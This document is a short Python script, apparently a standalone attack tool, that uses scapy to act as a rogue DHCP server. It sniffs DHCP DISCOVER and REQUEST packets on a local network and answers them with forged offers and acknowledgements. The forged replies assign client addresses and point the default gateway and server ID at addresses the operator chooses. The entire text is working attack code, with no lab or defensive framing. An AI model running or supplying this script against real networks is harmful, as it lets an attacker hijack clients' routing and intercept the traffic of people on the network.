from scapy.all import *

def rogue_dhcp(packet):
    if DHCP not in packet:
        return

    msg_type = packet[DHCP].options[0][1]
    if msg_type not in (1, 3):
        return

    response_type = "offer" if msg_type == 1 else "ack"
    print(f"[{'DISCOVER' if msg_type == 1 else 'REQUEST'}] → {response_type.upper()}")

    sendp(
        Ether(dst="ff:ff:ff:ff:ff:ff") /
        IP(src="10.1.10.2", dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(op=2, yiaddr="10.1.10.252", siaddr="10.1.10.2",
              flags=0x8000,
              chaddr=packet[BOOTP].chaddr, xid=packet[BOOTP].xid) /
        DHCP(options=[("message-type", response_type), ("server_id", "10.1.10.2"),
                      ("lease_time", 86400), ("router", "10.1.10.254"),
                      ("subnet_mask", "255.255.255.0"), "end"]),
        iface="eth0", verbose=0
    )

sniff(filter="udp and port 67", prn=rogue_dhcp, iface="eth0", store=0)